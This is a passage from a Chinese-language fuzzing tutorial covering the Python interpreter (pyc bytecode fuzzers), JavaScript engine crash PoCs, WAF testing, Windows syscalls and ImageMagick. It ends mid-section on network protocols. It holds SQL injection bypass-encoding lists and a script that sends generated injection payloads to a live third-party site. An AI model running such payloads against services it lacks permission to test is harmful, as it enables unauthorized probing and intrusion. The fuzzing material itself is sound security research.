<p>关于Python 的库代码,我们可以从Python 安装路径下的<code>Lib</code> 目录中找到</p>
<p><img src="pic2/python_lib.png" alt="" /></p>
<p>每个库都能够去找个针对性的Fuzzer 跑一跑,不过有些Python 库是做系统操作的,<strong>重点挑一些外部数据可以流进来,然后又可以进行处理的</strong>,比如:json,urllib,requests 这些库.本地库找到漏洞有时候利用会比较鸡肋,除非你的渗透对象是云服务(比如SAE 这种只提供一个执行容器的云,那么我们就需要找到一个可以绕过Python 解析器能够直接执行二进制代码的方式来绕过沙盒,如果读者不是很理解这个操作,同样的原理请参考pwn2own 从浏览器到系统system/root 提权),否则能够用利用的地方比较少.这个是我在挖requests 的时候挖到的一个洞,可以在Cookie <code>max-age</code> 中设置字符串值触发Cookielib 处理异常,丢弃掉这个Set-cookie 字段,让爬虫无法获取Cookie .传送门:https://github.com/lcatro/Python_CookieLib_0day</p>
<p>上面提到的库都是Python 的代码相互调用,但是有一些库是能触发二进制代码的,比如:http://www.freebuf.com/articles/network/27817.html</p>
<h3 id="python-内部对象"><a class="header" href="#python-内部对象">Python 内部对象</a></h3>
<p>说到Python 内部对象,对没有了解过解析器是如何做到远程代码执行的同学推荐阅读:https://github.com/lcatro/vuln_javascript</p>
<p>对内部对象做一些的操作,最后可以达到RCE (远程代码执行)的结果.我们先看看PoC 是怎么样的(以JavaScript 为例子,Python 版没有找到,原理都差不多的),Link :https://github.com/tunz/js-vuln-db</p>
<pre><code>
    PoC 1 :

        function opt() {
            let obj = '2.3023e-320';
            for (let i = 0; i &lt; 1; i++) {
                obj.x = 1;
                obj = +obj;
                obj.x = 1;
            }
        }

        function main() {
            for (let i = 0; i &lt; 100; i++) {
                opt();
            }
        }

        main();


    PoC 2 :

        function opt() {
            let arr = [];
            return arr['x'];
        }

        function main() {
            let arr = [1.1, 2.2, 3.3];
            for (let i = 0; i &lt; 0x10000; i++) {
                opt();
            }

            Array.prototype.__defineGetter__('x', Object.prototype.valueOf);

            print(opt());
        }

        main();


    PoC 3 :

        var f = function()
        {
          var o = { a: {}, b: { ba: { baa: 0, bab: [] }, bb: {}, bc: { bca: {bcaa: 0, bcab: 0, bcac: this} } } };
          o.b.bc.bca.bcab = 0;
          o.b.bb.bba = Array.prototype.slice.apply(o.b.ba.bab);
        };
        while(true) f(f);

</code></pre>
<p>细心的你应该能从这些PoC 里面发现了很多Fuzzing 的痕迹,对于这种涉及到解析器运行时产生的问题,是需要构造代码来Fuzzing 的.要展开来讲还需要用很多篇幅,后面还会介绍到一个东西叫AST (抽象语法树),读者们可以结合AST 和js-vuln-db 的PoC 这两个东西一起细细琢磨,很有意思的.</p>
<h3 id="python-运行环境"><a class="header" href="#python-运行环境">Python 运行环境</a></h3>
<p>Python 运行环境有两部分:编译和执行.Python 的编译请参考<code>compile()</code> 函数,我们关注Python 运行环境的执行部分,对应的源码在<code>Python/Ceval.c PyEval_EvalFrameEx()</code>.Python 的OpCode 的格式如下:</p>
<pre><code>
    | OpCode |                      没有操作数的OpCode
    | OpCode | OpNum1 |             一个操作数的OpCode
    | OpCode | OpNum1 | OpNum2 |    两个操作数的OpCode

</code></pre>
<p>关于操作码的具体信息在<code>Include/Opcode.h</code> 里.那么我们生成的Python 字节码要怎么样才能传递到<code>PyEval_EvalFrameEx()</code> 里执行呢?</p>
<h2 id="fuzzing-的入口点"><a class="header" href="#fuzzing-的入口点">Fuzzing 的入口点</a></h2>
<p>找到攻击点之后,还需要给Fuzzing 构建一个入口点,让我们的Fuzzing 生成的数据流能够进入到这些地方去.以AFL 为例子(本篇文章没有介绍AFL 的使用,读者们可以从这里了解更多关于AFL 的使用:https://github.com/lcatro/Fuzzing-ImageMagick ;关于libFuzzer 推荐阅读:https://github.com/Dor1s/libfuzzer-workshop (入门教程);https://github.com/google/fuzzer-test-suite (真实的测试用例)),我们给AFL Fuzzing 的入口点就是命令行,通过使用不同的命令参数组合来触发更多的代码覆盖率,举个例子</p>
<pre><code class="language-bash">
    afl-fuzz -i samples -o output ./magick convert @@ /dev/null
    afl-fuzz -i samples -o output ./magick composite @@ /dev/null
    afl-fuzz -i samples -o output ./magick compare @@ /dev/null
    afl-fuzz -i samples -o output ./magick montage @@ /dev/null

</code></pre>
<p>AFL 就会把变异的样本传递进去测试,有些库是完全没有像ImageMagick 这种入口的,比如:libGif ,libxml 这些,就得要手工构造入口点,再提供给AFL 来Fuzzing</p>
<p>对于Python 来说,我们还有pyc 文件,pyc 文件里面保存的是Python OpCode ,使用Python 执行pyc 之后,最后会将OpCode 传递到<code>PyEval_EvalFrameEx()</code> 执行,关于pyc 的文件结构读者们可以自行搜素,下面放一段打包字节码成pyc 结构的代码</p>
<pre><code class="language-python">
    import marshal

    class code_object(object):

        def __init__(self) :
            self.co_argcount=0
            self.co_nlocals=0
            self.co_stacksize=1
            self.co_flags=0x40
            self.co_code=b''
            self.co_consts=()
            self.co_names=()
            self.co_varnames=()
            self.co_filename=''
            self.co_name='&lt;module&gt;'
            self.co_firstlineno=1
            self.co_lnotab=b'\x00\x01'
            self.co_freevars=()
            self.co_cellvars=()

    def serialize_code_object(code_object) :
        code_buffer=b'\x63'
        code_buffer+=marshal.dumps(code_object.co_argcount)[1:]
        code_buffer+=marshal.dumps(code_object.co_nlocals)[1:]
        code_buffer+=marshal.dumps(code_object.co_stacksize)[1:]
        code_buffer+=marshal.dumps(code_object.co_flags)[1:]
        code_buffer+=marshal.dumps(code_object.co_code)
        code_buffer+=marshal.dumps(code_object.co_consts)
        code_buffer+=marshal.dumps(code_object.co_names)
        code_buffer+=marshal.dumps(code_object.co_varnames)
        code_buffer+=marshal.dumps(code_object.co_freevars)
        code_buffer+=marshal.dumps(code_object.co_cellvars)
        code_buffer+=marshal.dumps(code_object.co_filename)
        code_buffer+=marshal.dumps(code_object.co_name)
        code_buffer+=struct.pack('L',code_object.co_firstlineno)
        code_buffer+=marshal.dumps(code_object.co_lnotab)

        return code_buffer

    def save_to_pyc(file_path,code_object) :
        file=open(file_path, 'wb')

        if file :
            file.write(imp.get_magic())
            file.write(struct.pack('L',time.time()))
            file.write(serialize_code_object(code_object))
            file.close()

    def make_code_object(opcode_data) :
        compile_code_object = python_opcode_build.code_object()

        compile_code_object.co_argcount = 0
        compile_code_object.co_code = packet_code_object_in_try_block(opcode_data)
        compile_code_object.co_consts = tuple(make_random_string_list(3,8),)
        compile_code_object.co_names = tuple(make_random_string_list(3,8))
        compile_code_object.co_varnames = tuple(make_random_string_list(3,8))

        return compile_code_object


</code></pre>
<h2 id="fuzzing-数据生成"><a class="header" href="#fuzzing-数据生成">Fuzzing 数据生成</a></h2>
<p>找到了一个攻击点并且构造好Fuzzing 入口点之后,这个时候就需要传递一些数据进去测试了,一般有两种方式进行Fuzzing</p>
<h3 id="随机生成数据"><a class="header" href="#随机生成数据">随机生成数据</a></h3>
<p>随机生成数据是真的随机,我们来看看Fuzzer 的代码</p>
<pre><code class="language-python">

    import imp
    import marshal
    import os
    import random
    import struct
    import time


    class code_object_class(object):

        def __init__(self) :
            self.co_argcount=0
            self.co_nlocals=0
            self.co_stacksize=1
            self.co_flags=0x40
            self.co_code=b''
            self.co_consts=()
            self.co_names=()
            self.co_varnames=()
            self.co_filename=''
            self.co_name='&lt;module&gt;'
            self.co_firstlineno=1
            self.co_lnotab=b'\x00\x01'
            self.co_freevars=()
            self.co_cellvars=()

    def serialize_code_object(code_object) :
        code_buffer=b'\x63'
        code_buffer+=marshal.dumps(code_object.co_argcount)[1:]
        code_buffer+=marshal.dumps(code_object.co_nlocals)[1:]
        code_buffer+=marshal.dumps(code_object.co_stacksize)[1:]
        code_buffer+=marshal.dumps(code_object.co_flags)[1:]
        code_buffer+=marshal.dumps(code_object.co_code)
        code_buffer+=marshal.dumps(code_object.co_consts)
        code_buffer+=marshal.dumps(code_object.co_names)
        code_buffer+=marshal.dumps(code_object.co_varnames)
        code_buffer+=marshal.dumps(code_object.co_freevars)
        code_buffer+=marshal.dumps(code_object.co_cellvars)
        code_buffer+=marshal.dumps(code_object.co_filename)
        code_buffer+=marshal.dumps(code_object.co_name)
        code_buffer+=struct.pack('L',code_object.co_firstlineno)
        code_buffer+=marshal.dumps(code_object.co_lnotab)

        return code_buffer

    def save_to_pyc(file_path,code_object) :
        file=open(file_path, 'wb')

        if file :
            file.write(imp.get_magic())
            file.write(struct.pack('L',time.time()))
            file.write(serialize_code_object(code_object))
            file.close()

    def make_random_string(length) :
        data = ''

        for index in range(length) :
            data += chr(random.randint(0,255))

        return data

    def make_random_string_list(list_count,string_length) :
        return_list = []

        for list_index in range(list_count) :
            for string_index in range(list_count) :
                return_list.append(make_random_string(string_length))

        return return_list

    def packet_code_object_in_try_block(code) :
        code_length_low = (len(code) % 0x100) &amp; 0xFF
        code_length_height = (len(code) &gt;&gt; 8) &amp; 0xFF

        try_block = b'\x79'
        try_block += chr(code_length_height)
        try_block += chr(code_length_low)
        try_block += code
        try_block += b'\x6e\x07\x00\x01\x01\x01\x6e\x01\x00\x58\x64\x01\x00\x53'

        return try_block

    def make_code_object(opcode_data) :
        compile_code_object = code_object_class()

        compile_code_object.co_argcount = 0
        compile_code_object.co_code = packet_code_object_in_try_block(opcode_data)
        compile_code_object.co_consts = tuple(make_random_string_list(3,8),)
        compile_code_object.co_names = tuple(make_random_string_list(3,8))
        compile_code_object.co_varnames = tuple(make_random_string_list(3,8))

        return compile_code_object


    if __name__ == '__main__' :
        while True :
            code_object = make_code_object(make_random_string(64))

            save_to_pyc('python_fuzzing.tmp.pyc',code_object)

            os.system('python python_fuzzing.tmp.pyc')

</code></pre>
<p>运行效果</p>
<p><img src="pic2/fuzzing_state.png" alt="" /></p>
<h3 id="按结构生成数据"><a class="header" href="#按结构生成数据">按结构生成数据</a></h3>
<p>上面的Fuzzing 已经出现了崩溃的结果,现在我们可以开开心心地拿样本来分析漏洞崩溃原因了,不过这里是在讨论如何Fuzzing ,所以就不多做漏洞分析了,细心的你应该观察到了这一点</p>
<p><img src="pic2/error_fuzzing.png" alt="" /></p>
<p>这些OpCode 无法被运行环境所识别,所以提示了异常.重复来跑这种没有意义的Fuzzing 其实是很低效的,我们回去阅读<code>PyEval_EvalFrameEx()</code> 找到解决问题的答案.</p>
<p>在<code>Python/Ceval.c:1199</code> 行代码里,这里是OpCode 的解析执行部分,我们看这个switch 的default 部分(<code>Python/Ceval.c:3134</code>)</p>
<pre><code class="language-c">
    default:
        fprintf(stderr,
            &quot;XXX lineno: %d, opcode: %d\n&quot;,
            PyFrame_GetLineNumber(f),
            opcode);
        PyErr_SetString(PyExc_SystemError, &quot;unknown opcode&quot;);
        why = WHY_EXCEPTION;
        break;

</code></pre>
<p>原来是OpCode 没有被case 语句判断成功,那么再去看看<code>include\Opcode.h</code> 的OpCode 都有哪些取值</p>
<pre><code class="language-c">
    #ifndef Py_OPCODE_H
    #define Py_OPCODE_H
    #ifdef __cplusplus
    extern &quot;C&quot; {
    #endif


    /* Instruction opcodes for compiled code */

    #define STOP_CODE	0
    #define POP_TOP		1
    #define ROT_TWO		2
    #define ROT_THREE	3

    // .....

    #define SETUP_WITH 143

    /* Support for opargs more than 16 bits long */
    #define EXTENDED_ARG  145

    #define SET_ADD         146
    #define MAP_ADD         147


    enum cmp_op {PyCmp_LT=Py_LT, PyCmp_LE=Py_LE, PyCmp_EQ=Py_EQ, PyCmp_NE=Py_NE, PyCmp_GT=Py_GT, PyCmp_GE=Py_GE,
             PyCmp_IN, PyCmp_NOT_IN, PyCmp_IS, PyCmp_IS_NOT, PyCmp_EXC_MATCH, PyCmp_BAD};

    #define HAS_ARG(op) ((op) &gt;= HAVE_ARGUMENT)

    #ifdef __cplusplus
    }
    #endif
    #endif /* !Py_OPCODE_H */

</code></pre>
<p>这些OpCode 都是连续的,从0 到147 这个范围里取值,那么就可以确定<code>OpCode = range(0,104)</code> ,接下来再看第94 行和第166 行代码</p>
<pre><code class="language-c">
    #define HAVE_ARGUMENT	90	/* Opcodes from here have an argument: */  //  OpCode.h:90

    #define STORE_NAME	90	/* Index in name list */
    #define DELETE_NAME	91	/* &quot;&quot; */
    #define UNPACK_SEQUENCE	92	/* Number of sequence items */
    #define FOR_ITER	93
    #define LIST_APPEND	94

    // ...

    #define HAS_ARG(op) ((op) &gt;= HAVE_ARGUMENT)  //  OpCode.h:166

</code></pre>
<p>现在我们知道OpCode 的数值大于90 就是需要带参数的OpCode ,现在就需要找到OpNumber 的格式到底是怎么样的,来看看<code>Ceval.c:1167</code> 行代码</p>
<pre><code class="language-c">
    opcode = NEXTOP();
    oparg = 0;   /* allows oparg to be stored in a register because
        it doesn't have to be remembered across a full loop */
    if (HAS_ARG(opcode))
        oparg = NEXTARG();

    #define NEXTOP()        (*next_instr++)
    #define NEXTARG()       (next_instr += 2, (next_instr[-1]&lt;&lt;8) + next_instr[-2])

</code></pre>
<p>现在可以知道,OpCode 格式如下:</p>
<pre><code>
    不带参数:  OpCode (1 Byte)
    带参数:    OpCode (1 Byte) | OpNumber (2 Byte)

</code></pre>
<p>根据上面得到的信息,可以写一个按照结构生成数据的模块.</p>
<pre><code class="language-python">
    def opcode_no_opnumber() :  #  针对无操作数的指令进行数据生成
        opcode = random.randint(0,89)

        return chr(opcode)

    def opcode_has_opnumber() :  #  针对有操作数的指令进行数据生成
        opcode = random.randint(90,104)
        opnumber1 = random.randrange(0xFF)
        opnumber2 = random.randrange(0xFF)

        return chr(opcode) + chr(opnumber1) + chr(opnumber2)

    def make_opcode_stream(opcode_length = 6) :
        opcode_stream = ''

        for index in range(opcode_length) :
            if random.randint(0,1) :  #  50% 的选择概率
                opcode_stream += opcode_no_opnumber()
            else :
                opcode_stream += opcode_has_opnumber()

        return opcode_stream

</code></pre>
<p>写好了这两个模块之后,还需要修改这些代码</p>
<pre><code class="language-python">
    def make_code_object(opcode_data) :
        compile_code_object = code_object_class()

        compile_code_object.co_argcount = 0
        compile_code_object.co_code = opcode_data
        compile_code_object.co_consts = tuple(make_random_string_list(3,8),)
        compile_code_object.co_names = tuple(make_random_string_list(3,8))
        compile_code_object.co_varnames = tuple(make_random_string_list(3,8))

        return compile_code_object


    if __name__ == '__main__' :
        while True :
            code_object = make_code_object(make_opcode_stream())

            save_to_pyc('python_fuzzing.tmp.pyc',code_object)

            os.system('python python_fuzzing.tmp.pyc')

</code></pre>
<p>然后就可以继续跑Fuzzing 了,效果如下</p>
<p><img src="pic2/fuzzing_update_state.png" alt="" /></p>
<p><img src="pic2/fuzzing_update_state_1.png" alt="" /></p>
<p>往下继续运行,我们还是可以看到Python 运行环境抛出了OpCode 识别失败,我们再回去读读<code>Opcode.h</code> 的代码</p>
<pre><code class="language-c">
    #define SLICE		30
    /* Also uses 31-33 */
    #define SLICE_1		31
    #define SLICE_2		32
    #define SLICE_3		33

    #define STORE_SLICE	40
    /* Also uses 41-43 */
    #define STORE_SLICE_1	41
    #define STORE_SLICE_2	42
    #define STORE_SLICE_3	43

    #define DELETE_SLICE	50
    /* Also uses 51-53 */
    #define DELETE_SLICE_1	51
    #define DELETE_SLICE_2	52
    #define DELETE_SLICE_3	53

</code></pre>
<p>原来OpCode 的取值并不是连续的,这就解开了困扰我们的问题,读者们可以拿上面的代码去继续完善</p>
<h2 id="什么时候选择随机生成数据什么时候选择按结构生成数据"><a class="header" href="#什么时候选择随机生成数据什么时候选择按结构生成数据">什么时候选择随机生成数据,什么时候选择按结构生成数据</a></h2>
<p><strong>如果输入是有限制的,那就按结构生成数据,如果输入是无限制的,那就随机生成数据</strong></p>
<p>输入限制是什么意思呢?不妨来看几个例子</p>
<h3 id="fuzzing-waf"><a class="header" href="#fuzzing-waf">Fuzzing WAF</a></h3>
<p>对WAF Fuzzing .攻击点有:SQL Payload 拦截,XSS Payload 拦截,WebShell 拦截,文件目录拦截,系统命令拦截等部分.现在拿出SQL Payload Fuzzing 来说,SQL Payload 是有限的,比如:' ,&quot; ,select ,union ,where 等关键字,还有SQL Bypass Payload ,可以参考SQLMAP 的Bypass 套路:https://github.com/sqlmapproject/sqlmap/tree/master/tamper</p>
<p>对于输入是有限的Fuzzing ,<strong>一定要尽可能搜集多的关键字,提高Fuzzing 代码覆盖率</strong></p>
<pre><code class="language-python">
    sql_tiny_dict = ['select','from','*','where','order by','desc','asc','insert','top','limit',             #  SQL 基础语句
                     'update','delete','set','as','in','create','table','db'
                     '\'','&quot;','%','_',                                                                   #  特殊符号
                     '(',')','=','&lt;','&gt;','&lt;&gt;','&lt;=','=&gt;','between','like','+','-','and','or','not','|',     #  运算符
                     'NULL'
                    ]

    sql_function = [  #  函数
                    'avg','count','first','last','max','min','sum','ucase','lcase','mid','len','round','now','format',
                    'ascii','char','nchar','lower','upper','str','ltrim','rtrim','left','right','substring','charindex','patindex',
                    'quotename','replicate','reverse','replace','space','stuff','cast','convert','day','month','year','dateadd',
                    'datediff','datename','datepart','getdate','suser_name','user_name','user','show_role','db_name','object_name',
                    'col_name','col_length','valid_name','charindex','rank','column_name'
                   ]

    bypass_string = [  #  Bypass 关键字
                     '\'','&quot;',
                     '/*','*','*/','/**/',' ',b'\0','%00','()','//','\\','--','#','--+','-- -',';','#',
                     '%27','%u0027','%u02b9','%u02bc','%u02c8','%u2032','%uff07','%c0%27','%c0%a7','%e0%80%a7',  # '
                     '%20','%u0020','%uff00','%c0%20','%c0%a0','%e0%80%a0',                                      # space
                     '%28','%u0028','%uff08','%c0%28','%c0%a8','%e0%80%a8',                                      # (
                     '%29','%u0029','%uff09','%c0%29','%c0%a9','%e0%80%a9',                                      # )
                     '\r','%0D','\n','%0A','%0B','\r\n'
                    ]


    def make_payload(using_payload_count,using_bypass_count) :
        output_payload = ''

        if not random.randint(0,9) :  #  10%
            output_payload += random.choice(['\'','&quot;','%27','%28'])

            if not random.randint(0,1) :  #  5%
                output_payload += make_space()

        if not random.randint(0,3) :  #  25%
            output_payload += random.choice(bypass_string)

            if not random.randint(0,1) :  #  12.5%
                output_payload += make_space()

        for using_payload_count_index in range(using_payload_count) :
            if random.randint(0,1) :
                sql_tiny_element = random.choice(sql_tiny_dict)  #fuzzing_entry.random_encode_string( )
                bypass_payload = ''

                for using_bypass_count_index in range(using_bypass_count) :
                    bypass_payload += random.choice(bypass_string)

                sql_tiny_element += bypass_payload + make_space()
            else :
                sql_tiny_element = random.choice(sql_function)

                if random.randint(0,1) : #  25%
                    for using_bypass_count_index in range(using_bypass_count) :
                        sql_tiny_element += random.choice(bypass_string)

                sql_tiny_element += '(' + make_argument() + ')'

            output_payload += sql_tiny_element + make_space()

        return output_payload

    def fuzzing() :
        sql_url = 'https://cloud.tencent.com/?test='

        while True :
            sql_payload = make_payload(random.randint(1,6),random.randint(0,3))

            print 'SQL payload :',

            fuzzing_output.green_output(sql_payload)

            print 'is pass:' ,

            responed = requests.get(sql_url + sql_payload)

            if 200 == responed.status_code :
                fuzzing_output.red_output(str(responed.status_code))# + '  ' + responed.text)
            else :
                fuzzing_output.bule_output(str(responed.status_code))

            time.sleep(0.5)

</code></pre>
<p>运行结果如下,利用这个简单的Fuzzer 还找到了个腾讯云SQL Bypass 的洞.</p>
<p><img src="pic2/fuzzing_waf.png" alt="" /></p>
<h3 id="fuzzing-windows-内核"><a class="header" href="#fuzzing-windows-内核">Fuzzing Windows 内核</a></h3>
<p>Windows 内核的攻击点有很多,在这里我们只讨论内核函数syscall 的Fuzzing .参考链接:https://github.com/mwrlabs/KernelFuzzer ,https://github.com/tinysec/windows-syscall-table</p>
<p>syscall 是有固定格式的:内核函数SSDT 索引号,参数1,参数2 等等.我们来看看KernelFuzzer 里面是怎么样做Fuzzing 输入点的,代码在<code>bughunt_syscall.asm</code> 和<code>bughunt_syscall_x64.asm</code> 中</p>
<pre><code class="language-asm">
    mov ecx, [ebp + 18h] ; main (argv[5]) = dw0x04
    push ecx
    mov ecx, [ebp + 14h] ; main (argv[4]) = dw0x03
    push ecx
    mov ecx, [ebp + 10h] ; main (argv[3]) = dw0x02
    push ecx
    mov ecx, [ebp + 0Ch] ; main (argv[2]) = dw0x01
    push ecx             ; push argument in stack ..

    mov eax, [ebp + 08h] ; main (argv[1]) = syscall_uid

    mov edx, 7FFE0300h
    call dword ptr [edx] ;  call syscall ..

</code></pre>
<p>我们再来看看SSDT 内核函数的信息</p>
<div class="table-wrapper"><table><thead><tr><th>name</th><th>id32</th><th>id64</th><th>argc32</th><th>argc64</th><th>argcFrom</th></tr></thead><tbody>
<tr><td>NtAcceptConnectPort</td><td>2</td><td>2</td><td>6</td><td>6</td><td>wow64</td></tr>
<tr><td>NtAccessCheck</td><td>0</td><td>0</td><td>8</td><td>8</td><td>wow64</td></tr>
<tr><td>NtAccessCheckAndAuditAlarm</td><td>439</td><td>41</td><td>11</td><td>11</td><td>wow64</td></tr>
<tr><td>NtAccessCheckByType</td><td>438</td><td>99</td><td>11</td><td>11</td><td>wow64</td></tr>
<tr><td>NtAccessCheckByTypeAndAuditAlarm</td><td>437</td><td>89</td><td>16</td><td>16</td><td>wow64</td></tr>
<tr><td>NtAccessCheckByTypeResultList</td><td>436</td><td>100</td><td>11</td><td>11</td><td>wow64</td></tr>
<tr><td>NtAccessCheckByTypeResultListAndAuditAlarm</td><td>435</td><td>101</td><td>16</td><td>16</td><td>wow64</td></tr>
<tr><td>NtAccessCheckByTypeResultListAndAuditAlarmByHandle</td><td>434</td><td>102</td><td>17</td><td>17</td><td>wow64</td></tr>
</tbody></table>
</div>
<p>id32 ,id64 指的是32 和64 位平台下的内核函数序号.argc32 和argc64 是指32 和64 位平台下的内核函数参数个数.所以我们可以知道Fuzzing 数据的构造方式了</p>
<pre><code>
    syscall 2 a,b,c,d,e,f
    syscall 0 a,b,c,d,e,f,g,h
    syscall 439 a,b,c,d,e,f,g,h,i,j,k
    ...

</code></pre>
<p>再精细一点来设计这个Fuzzing ,就还需要考虑到句柄,内核缓冲区等各种信息,更多细节在此就不多细说了,感兴趣的读者可以阅读:https://github.com/mwrlabs/KernelFuzzer/blob/master/bughunt_thread.h</p>
<h3 id="fuzzing-imagemagick"><a class="header" href="#fuzzing-imagemagick">Fuzzing ImageMagick</a></h3>
<p>如果读者已经读过了我之前写过的那篇Fuzzing Imagemagick 的文章,可能你会对这段代码有疑惑,Link:https://github.com/lcatro/Fuzzing-ImageMagick/blob/master/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Fuzzing%E6%8C%96%E6%8E%98ImageMagick%E7%9A%84%E6%BC%8F%E6%B4%9E.md#5-如何使用libfuzzer-fuzzing-imagemagick ,摘录部分代码</p>
<pre><code class="language-c">
    static const struct {
    char
      *name;

    unsigned char
      *magic;

    unsigned int
      length,
      offset;
    } StaticMagic[] = {
        #define MAGIC(name,offset,magic) {name,(unsigned char *)magic,sizeof(magic)-1,offset}

        MAGIC(&quot;WEBP&quot;, 8, &quot;WEBP&quot;),
        MAGIC(&quot;AVI&quot;, 0, &quot;RIFF&quot;),
        MAGIC(&quot;8BIMWTEXT&quot;, 0, &quot;8\000B\000I\000M\000#&quot;),
        MAGIC(&quot;8BIMTEXT&quot;, 0, &quot;8BIM#&quot;),
        MAGIC(&quot;8BIM&quot;, 0, &quot;8BIM&quot;),
        MAGIC(&quot;BMP&quot;, 0, &quot;BA&quot;),
        MAGIC(&quot;BMP&quot;, 0, &quot;BM&quot;),
        MAGIC(&quot;BMP&quot;, 0, &quot;CI&quot;),
        MAGIC(&quot;BMP&quot;, 0, &quot;CP&quot;),
        MAGIC(&quot;BMP&quot;, 0, &quot;IC&quot;),
        MAGIC(&quot;BMP&quot;, 0, &quot;PI&quot;),
        MAGIC(&quot;CALS&quot;, 21, &quot;version: MIL-STD-1840&quot;),
        MAGIC(&quot;CALS&quot;, 0, &quot;srcdocid:&quot;),
        MAGIC(&quot;CALS&quot;, 9, &quot;srcdocid:&quot;),
        MAGIC(&quot;CALS&quot;, 8, &quot;rorient:&quot;),
        MAGIC(&quot;CGM&quot;, 0, &quot;BEGMF&quot;),

        //...
    };

    extern &quot;C&quot; int LLVMFuzzerTestOneInput(const unsigned char* data,unsigned int size) {
        int random_image_flag_index = random(data,size);
        unsigned int random_image_flag_offset = StaticMagic[random_image_flag_index].offset;
        unsigned int random_image_flag_length = StaticMagic[random_image_flag_index].length;
        unsigned int image_buffer_length = random_image_flag_offset + random_image_flag_length + size;
        unsigned char* image_buffer = (unsigned char*)malloc(image_buffer_length);

        memset(image_buffer,0,image_buffer_length);
        memcpy(image_buffer,StaticMagic[random_image_flag_index].name,StaticMagic[random_image_flag_index].length);

        FILE* file = fopen(GENARATE_FILE_NAME,&quot;w&quot;);

        if (NULL != file) {
            fwrite(image_buffer,1,image_buffer_length,file);
            fclose(file);

            printf(&quot;buffer=%s(0x%X), size=%d,input format=%s\n&quot;,image_buffer,image_buffer,image_buffer_length,StaticMagic[random_image_flag_index].name);

            ExceptionInfo exception;
            ImageInfo* read_image_info;
            ImageInfo* write_image_info;
            Image*     image;

            GetExceptionInfo(&amp;exception);

            read_image_info = CloneImageInfo((ImageInfo*)NULL);
            write_image_info = CloneImageInfo((ImageInfo*)NULL);

            strlcpy(read_image_info-&gt;filename,GENARATE_FILE_NAME,MaxTextExtent);
            strlcpy(write_image_info-&gt;filename,&quot;/dev/null&quot;,MaxTextExtent);
            SetImageInfo(read_image_info,SETMAGICK_READ,&amp;exception);
            SetImageInfo(write_image_info,SETMAGICK_WRITE,&amp;exception);

            image = ReadImage(read_image_info,&amp;exception);

            if (NULL != image)
                  WriteImage(write_image_info,image);

            DestroyImageInfo(read_image_info);
            DestroyImageInfo(write_image_info);
            DestroyExceptionInfo(&amp;exception);
        }

        free(image_buffer);

        return 0;
    }

</code></pre>
<p>这段代码的意思是,随机从<code>StaticMagic</code> 中选择一个图像头部特征,然后和libFuzzer 生成的数据拼接到一起.格式如下</p>
<pre><code>
    图像格式特征码 | libFuzzer 生成的数据

</code></pre>
<p>为什么要这么做呢?我们需要来阅读一下ImageMagick 的代码.图像格式特征码可以到<code>MagickCore/magic.c:90</code> 行找到声明.</p>
<pre><code class="language-c">
    static const MagicMapInfo
      MagicMap[] =
      {
        { &quot;8BIMWTEXT&quot;, 0, MagicPattern(&quot;8\000B\000I\000M\000#&quot;) },
        { &quot;8BIMTEXT&quot;, 0, MagicPattern(&quot;8BIM#&quot;) },
        { &quot;8BIM&quot;, 0, MagicPattern(&quot;8BIM&quot;) },
        { &quot;BMP&quot;, 0, MagicPattern(&quot;BA&quot;) },
        { &quot;BMP&quot;, 0, MagicPattern(&quot;BM&quot;) },
        { &quot;BMP&quot;, 0, MagicPattern(&quot;CI&quot;) },

        //...

        { &quot;XEF&quot;, 0, MagicPattern(&quot;FOVb&quot;) },
        { &quot;XPM&quot;, 1, MagicPattern(&quot;* XPM *&quot;) }
     };

</code></pre>
<p>ImageMagick 识别图片格式在<code>MagickCore/magic.c:368</code> 行找到函数.</p>
<pre><code class="language-c">
    MagickExport const MagicInfo *GetMagicInfo(const unsigned char *magic,
      const size_t length,ExceptionInfo *exception)
    {
      register const MagicInfo
        *p;

      assert(exception != (ExceptionInfo *) NULL);
      if (IsMagicCacheInstantiated(exception) == MagickFalse)
        return((const MagicInfo *) NULL);
      /*
        Search for magic tag.
      */
      LockSemaphoreInfo(magic_semaphore);
      ResetLinkedListIterator(magic_cache);
      p=(const MagicInfo *) GetNextValueInLinkedList(magic_cache);
      if (magic == (const unsigned char *) NULL)
        {
          UnlockSemaphoreInfo(magic_semaphore);
          return(p);
        }
      while (p != (const MagicInfo *) NULL)
      {
        assert(p-&gt;offset &gt;= 0);
        if (((size_t) (p-&gt;offset+p-&gt;length) &lt;= length) &amp;&amp;
            (memcmp(magic+p-&gt;offset,p-&gt;magic,p-&gt;length) == 0))  //  注意这里,判断图片特征码
          break;
        p=(const MagicInfo *) GetNextValueInLinkedList(magic_cache);
      }
      if (p != (const MagicInfo *) NULL)
        (void) InsertValueInLinkedList(magic_cache,0,
          RemoveElementByValueFromLinkedList(magic_cache,p));
      UnlockSemaphoreInfo(magic_semaphore);
      return(p);
    }

</code></pre>
<p>我们来读一下ImageMagick 的读取图片部分的代码,位置在<code>MagickCore/constitute.c:410</code></p>
<pre><code class="language-c">
    magick_info=GetMagickInfo(read_info-&gt;magick,sans_exception);
    sans_exception=DestroyExceptionInfo(sans_exception);
    if (magick_info != (const MagickInfo *) NULL) {  //  读取图像信息

      // ...

      if ((magick_info != (const MagickInfo *) NULL) &amp;&amp;
          (GetImageDecoder(magick_info) != (DecodeImageHandler *) NULL))
        {
          if (GetMagickDecoderThreadSupport(magick_info) == MagickFalse)
            LockSemaphoreInfo(magick_info-&gt;semaphore);
          image=GetImageDecoder(magick_info)(read_info,exception);

        // ...

</code></pre>
<p>由此可知,只有能被ImageMagick 识别到的图像格式才可以被传递到对应的图像解析decoder 里面去解析数据.但是我们并不关心decoder 是怎么样去解析的,所以这部分我们使用随机生成数据.为什么不全部都用随机生成数据呢,这样会导致生成的图像特征码都是随机的,碰撞到正确的图像特征码的概率很低,浪费很多时间和资源在这些没有意义的地方.所以我们需要给定一个区间来让Fuzzer 生成数据,这样才能让ImageMagick 选择到decoder 来解析,如果我们要对所有的图像格式都要做对应的针对适配,<strong>没有统一的格式</strong>,按照特定的格式来生成数据,这样的人力成本太大了,不如让Fuzzer 随机生成数据.</p>
<h3 id="fuzzing-网络协议"><a class="header" href="#fuzzing-网络协议">Fuzzing 网络协议</a></h3>
<p>网络协议都是已经固定好的数据格式,然后由一方发出到另一方来解析执行.我们来回顾一下C 语言的struct 结构</p>
<pre><code class="language-c">
    typedef struct {
        int  packet_type;
        int  packet_data_length;
        char packet_data;
    } packet ;

</code></pre>
<p>这个结构对应的内存布局</p>
<pre><code>
    packet_type(4 Byte) | packet_data_length(4 Byte) | packet_data(packet_data_length Byte)

